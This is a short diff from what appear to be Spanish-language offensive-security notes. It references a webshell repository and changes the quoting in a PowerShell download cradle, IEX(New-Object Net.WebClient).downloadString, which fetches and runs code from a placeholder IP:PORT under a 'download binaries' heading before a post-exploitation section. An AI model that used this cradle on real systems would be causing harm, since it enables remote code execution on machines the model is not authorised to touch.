@@ -17,7 +17,7 @@ https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
 
 Descargar binarios
 ```
-powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
+powershell IEX(New-Object Net.WebClient).downloadString("http://IP:PORT/binario.binario")
 ```
 
 # PostExplotacion
